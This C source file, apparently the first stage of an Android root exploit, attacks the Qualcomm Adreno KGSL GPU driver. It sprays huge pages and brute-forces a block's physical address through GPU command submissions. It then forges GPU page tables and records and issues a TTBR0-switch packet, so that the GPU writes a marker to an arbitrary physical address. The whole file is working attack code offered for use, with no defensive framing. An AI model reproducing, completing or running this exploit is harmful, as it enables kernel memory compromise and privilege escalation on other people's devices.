/* kgsl_root1.c — TTBR0 切换验证实验(第一段)
 * 1. spray 64×2MB THP + 找块物理基(v5 探针, page5 区扫描)
 * 2. 构造: 记录(奇数 dword=表物理基) + GPU 页表(VA 0x6000000000 → 块内 0x7000)
 * 3. {0xD3{rec=块基} + MEM_WRITE VA 0x6000000000 ← marker} → 验证落地
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include "adrenaline.h"

#define BLOCK_SZ 0x200000UL
#define NBLOCKS 64
#define REC_ATTR 0   /* MemAttr idx 0 */

static int fd;
static uint64_t g_clsz;
static uint32_t *ib;
static uint64_t ib_ga;
static uint32_t ctx;
static uint8_t *blk[NBLOCKS];

static void cache_op(void *s, void *e, int inv) {
    s = (char*)((uintptr_t)s & ~(g_clsz - 1));
    for (; s < e; s += g_clsz) {
        if (inv) __asm volatile("dc civac, %0" : : "r" (s) : "memory");
        else     __asm volatile("dc cvac, %0"  : : "r" (s) : "memory");
    }
    __asm volatile("dsb ish" ::: "memory");
}
static double now_s(void) {
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
}
static void ctx_create(void) {
    struct kgsl_drawctxt_create req = { .flags = 0x00001812 };
    int r = ioctl(fd, _IOWR(0x09, 0x13, struct kgsl_drawctxt_create), &req);
    if (!r) ctx = req.drawctxt_id;
}
static void ctx_recreate(void) {
    ioctl(fd, _IOW(0x09, 0x14, struct kgsl_drawctxt_destroy),
          &(struct kgsl_drawctxt_destroy){ .drawctxt_id = ctx });
    ctx_create();
}
static int gpu_command(uint64_t gaddr, uint32_t size) {
    struct kgsl_command_object c;
    struct kgsl_gpu_command req;
    memset(&c, 0, sizeof(c));
    c.flags = KGSL_CMDLIST_IB;
    c.gpuaddr = gaddr; c.size = size;
    memset(&req, 0, sizeof(req));
    req.context_id = ctx;
    req.cmdsize = sizeof(c);
    req.numcmds = 1;
    req.cmdlist = (unsigned long)&c;
    return ioctl(fd, _IOWR(0x09, 0x4A, struct kgsl_gpu_command), &req);
}
static uint64_t wait_ts(uint32_t ts, uint32_t timeout_ms) {
    struct { uint32_t context_id, timestamp, timeout; } w = { ctx, ts, timeout_ms };
    double t0 = now_s();
    ioctl(fd, _IOWR(0x09, 0x07, char[12]), &w);
    return (uint64_t)((now_s() - t0) * 1000);
}
static long thp_bytes_of(void *p) {
    FILE *f = fopen("/proc/self/smaps", "r");
    if (!f) return -1;
    char line[256];
    uintptr_t target = (uintptr_t)p;
    int in = 0; long thp = -1;
    while (fgets(line, sizeof(line), f)) {
        uintptr_t lo, hi;
        if (sscanf(line, "%lx-%lx", &lo, &hi) == 2) { in = (target >= lo && target < hi); if (in) thp = 0; }
        else if (in && !strncmp(line, "AnonHugePages:", 14)) sscanf(line + 14, "%ld", &thp);
    }
    fclose(f);
    return thp;
}
static int spray(void) {
    for (int j = 0; j < NBLOCKS; j++) {
        uint8_t *raw = mmap(NULL, BLOCK_SZ * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (raw == MAP_FAILED) return 1;
        uint8_t *base = (uint8_t*)(((uintptr_t)raw + BLOCK_SZ - 1) & ~(BLOCK_SZ - 1));
        madvise(base, BLOCK_SZ, MADV_HUGEPAGE);
        memset(base, 0, BLOCK_SZ);
        blk[j] = base;
    }
    int ok = 0;
    for (int j = 0; j < NBLOCKS; j++)
        if (thp_bytes_of(blk[j]) >= (long)BLOCK_SZ / 1024) ok++;
    printf("[spray] THP %d/%d\n", ok, NBLOCKS);
    return ok == NBLOCKS ? 0 : 1;
}

/* v5 探针填充: 候选 B 的 6 页(全部块同填) + sled marker */
static void fill_probe(uint64_t B) {
    uint64_t laf = 0x1 | (1 << 6) | (2 << 8) | (1 << 10);  /* 无 nG, MemAttr idx0 */
    for (int j = 0; j < NBLOCKS; j++) {
        uint64_t *pg0 = (uint64_t*)blk[j];
        uint64_t *pg1 = (uint64_t*)(blk[j] + 0x1000);
        uint64_t *pg3 = (uint64_t*)(blk[j] + 0x3000);
        uint64_t *pg4 = (uint64_t*)(blk[j] + 0x4000);
        uint64_t *pg5 = (uint64_t*)(blk[j] + 0x5000);
        memset(blk[j], 0, 0x6000);
        pg0[0] = (B + 0x1000) | 3;
        pg0[1] = (B + 0x1000) | 3;
        pg0[0x100] = (B + 0x1000) | 3;
        pg1[0] = (B + 0x3000) | 3;
        pg1[0x100] = (B + 0x3000) | 3;
        pg1[1] = (B + 0x2000) | 3;
        pg1[2] = (B + 0x2000) | 3;
        pg3[0] = (B + 0x4000) | 3;
        for (int i = 1; i < 512; i++) pg3[i] = (B + 0x5000) | laf;
        for (int i = 0; i < 512; i++) pg4[i] = (B + 0x5000) | laf;
        for (int i = 0; i < 512; i++) pg5[i] = 0x80000000u;
        pg5[32] = 0x703D8003;
        pg5[33] = 0x00001090; pg5[34] = 0x00000040;
        pg5[35] = 0x41414141;
        pg5[500] = 0x703F0003; pg5[501] = 0x00001000;
        pg5[502] = 0x00000040; pg5[503] = 0x000001F8;
    }
    for (int j = 0; j < NBLOCKS; j++)
        cache_op(blk[j], blk[j] + 0x6000, 0);
}

/* 找块 0 物理基 */
static uint64_t find_base(uint64_t start, uint64_t count) {
    uint32_t ts = 0;
    for (uint64_t k = 0; k < count; k++) {
        uint64_t B = start + k * BLOCK_SZ;
        fill_probe(B);
        uint32_t *c = ib;
        *c++ = cp_type7_packet(0xD3, 4);
        *c++ = lower_32_bits(B); *c++ = upper_32_bits(B);
        *c++ = 0; *c++ = 0;
        *c++ = cp_type7_packet(0x3f, 3);
        *c++ = 0x00001000; *c++ = 0x00000040;
        *c++ = 0x000001F8;
        uint32_t dw = (uint32_t)(c - ib);
        cache_op((uint8_t*)ib, (uint8_t*)ib + dw * 4, 0);
        ts++;
        int r = gpu_command(ib_ga, dw * 4);
        if (r) { ctx_recreate(); r = gpu_command(ib_ga, dw * 4); }
        wait_ts(ts, 3000);
        /* 扫各块 page5 0x5000-0x5400 */
        int hitb = -1;
        for (int j = 0; j < NBLOCKS && hitb < 0; j++) {
            cache_op(blk[j] + 0x5000, blk[j] + 0x5400, 1);
            uint32_t *w = (uint32_t*)(blk[j] + 0x5000);
            for (uint64_t o = 0; o < 0x400 / 4; o++)
                if (w[o] == 0x41414141u) { hitb = j; break; }
        }
        if (k % 256 == 0)
            printf("  [%7.1fs] %llu/%llu B=0x%llx hit=%d\n",
                   now_s(), (unsigned long long)k + 1, (unsigned long long)count,
                   (unsigned long long)B, hitb);
        if (hitb >= 0) {
            printf("*** 块基: B = 0x%llx (块 %d) ***\n", (unsigned long long)B, hitb);
            return B;
        }
        ctx_recreate();
    }
    printf("未找到块基\n");
    return 0;
}

/* GPU 页表项属性(全局, 无 nG) */
#define PTE_AF (1 << 6)
static uint64_t pte_page(uint64_t phys) { return phys | 0x1 | PTE_AF | (2 << 8) | (REC_ATTR << 2); }

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t ctr; asm("mrs\t%x0, ctr_el0" : "=r"(ctr));
    g_clsz = 4 << ((ctr >> 16) & 0xf);
    fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return 1;
    ib = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memset(ib, 0, 0x1000);
    struct kgsl_map_user_mem m;
    memset(&m, 0, sizeof(m));
    m.len = 0x1000; m.hostptr = (unsigned long)ib; m.memtype = KGSL_USER_MEM_TYPE_ADDR;
    if (ioctl(fd, _IOWR(0x09, 0x15, struct kgsl_map_user_mem), &m)) return 1;
    ib_ga = m.gpuaddr;
    printf("# ib_ga=0x%llx\n", (unsigned long long)ib_ga);
    if (spray()) return 1;
    ctx_create();

    /* 1. 找块基 */
    uint64_t BLK0BASE = find_base(0x40000000ull, 7168);
    if (!BLK0BASE) return 1;
    ctx_recreate();

    /* 2. 构造记录 + GPU 页表(全在块 0, CPU 可写) */
    printf("\n===== 构造记录 + 页表 =====\n");
    /* 记录区: 块内 0x320-0xA00: 奇 dword = 0x40010000(表物理), 偶 = 0(count) */
    for (uint64_t o = 0x320; o < 0xA00; o += 4) {
        uint32_t v = ((o / 4) % 2 == 1) ? 0x40010000u : 0u;
        *(uint32_t*)(blk[0] + o) = v;
    }
    /* 其他记录区: 0x3c4(40d), 0x688(0xc7d), 0x9a8(22d) — 8字节对 {lo=表基, hi=0} */
    for (uint64_t base = 0x3c4; base + 8 <= 0x3c4 + 160; base += 8) {
        *(uint32_t*)(blk[0] + base) = 0x40010000u;
        *(uint32_t*)(blk[0] + base + 4) = 0;
    }
    for (uint64_t base = 0x688; base + 8 <= 0x688 + 796; base += 8) {
        *(uint32_t*)(blk[0] + base) = 0x40010000u;
        *(uint32_t*)(blk[0] + base + 4) = 0;
    }
    for (uint64_t base = 0x9a8; base + 8 <= 0x9a8 + 88; base += 8) {
        *(uint32_t*)(blk[0] + base) = 0x40010000u;
        *(uint32_t*)(blk[0] + base + 4) = 0;
    }
    /* GPU 页表 @ 块内 0x10000-0x13FFF: VA 0x6000000000 → phys BLK0BASE+0x7000 */
    uint64_t *L0 = (uint64_t*)(blk[0] + 0x10000);
    uint64_t *L1 = (uint64_t*)(blk[0] + 0x11000);
    uint64_t *L2 = (uint64_t*)(blk[0] + 0x12000);
    uint64_t *L3 = (uint64_t*)(blk[0] + 0x13000);
    memset(L0, 0, 0x4000);
    L0[0] = (BLK0BASE + 0x11000) | 3;
    L1[0x180] = (BLK0BASE + 0x12000) | 3;
    L2[0] = (BLK0BASE + 0x13000) | 3;
    /* L3[0]: VA 0x6000000000-0x6000000FFF → phys BLK0BASE+0x7000 (全局, 无 nG) */
    L3[0] = (BLK0BASE + 0x7000) | 0x1 | PTE_AF | (2 << 8) | (REC_ATTR << 2);
    cache_op(blk[0] + 0x320, blk[0] + 0x14000, 0);
    printf("记录+页表就绪(表物理=0x40010000, 窗口 VA=0x6000000000 → phys BLK0BASE+0x7000)\n");

    /* 3. 切换 + marker 验证 */
    printf("\n===== TTBR0 切换 + marker 验证 =====\n");
    uint32_t ts = 0;
    /* 预清窗口目标区 */
    memset(blk[0] + 0x7000, 0, 0x1000);
    cache_op(blk[0] + 0x7000, blk[0] + 0x8000, 0);
    /* 批次 1: 仅切换 */
    uint32_t *c = ib;
    *c++ = cp_type7_packet(0xD3, 4);
    *c++ = 0x40010000; *c++ = 0;                 /* ttbr */
    *c++ = 0x40000000;                            /* rec = 块 0 物理基 */
    *c++ = 0;                                     /* flags */
    uint32_t dw = (uint32_t)(c - ib);
    cache_op((uint8_t*)ib, (uint8_t*)ib + dw * 4, 0);
    ts++;
    int r = gpu_command(ib_ga, dw * 4);
    if (r) { ctx_recreate(); r = gpu_command(ib_ga, dw * 4); }
    uint64_t ms = wait_ts(ts, 6000);
    printf("批次1(切换): submit=%d 退役=%llums\n", r, (unsigned long long)ms);
    /* 批次 2: marker(切换后的翻译下执行) */
    c = ib;
    *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
    *c++ = 0x00000000; *c++ = 0x00000060;         /* VA 0x6000000000 */
    *c++ = 0x41414141;
    cache_op((uint8_t*)ib, (uint8_t*)ib + dw * 4, 0);
    ts++;
    r = gpu_command(ib_ga, 16);
    if (r) { ctx_recreate(); r = gpu_command(ib_ga, 16); }
    uint64_t ms2 = wait_ts(ts, 6000);
    printf("批次2(marker): submit=%d 退役=%llums\n", r, (unsigned long long)ms2);
    /* 验证: 块内 0x7000 (phys BLK0BASE+0x7000) */
    cache_op(blk[0] + 0x7000, blk[0] + 0x7004, 1);
    uint32_t got = *(uint32_t*)(blk[0] + 0x7000);
    printf("窗口 phys BLK0BASE+0x7000 = 0x%08x %s\n", got,
           got == 0x41414141 ? "<<< TTBR0 切换验证成功: GPU 经我们的页表写入了任意物理地址!!!" : "(未落地)");
    *(uint32_t*)(blk[0] + 0x7000) = 0;
    cache_op(blk[0] + 0x7000, blk[0] + 0x7004, 0);
    printf("done alive\n");
    return 0;
}
